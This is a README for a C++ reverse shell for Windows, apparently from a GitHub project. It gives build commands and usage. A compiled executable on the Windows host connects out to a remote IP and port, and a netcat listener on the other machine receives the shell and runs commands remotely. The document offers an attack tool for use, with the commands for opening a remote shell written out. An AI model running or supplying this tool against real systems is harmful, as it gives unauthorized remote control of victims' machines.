# C ++ Reverse Shell

Connect Windows host to a remote machine and run Windows shell commands remotely over TCP.

## Building

Prerequisite: MinGW or MSYS2 compiler toolchain.

```
git clone https://github.com/dev-frog/C-Reverse-Shell.git
cd C-Reverse-Shell
mkdir build
cd build
cmake ..
make
```  

## Testing

On the Windows machine:

```
./c-reverse-shell.exe 192.168.1.3 4444
```

On the remote machine:

```
netcat -lvnp 4444
```

Start typing commands on the remote machine, right after receiving "Connection from..." message.

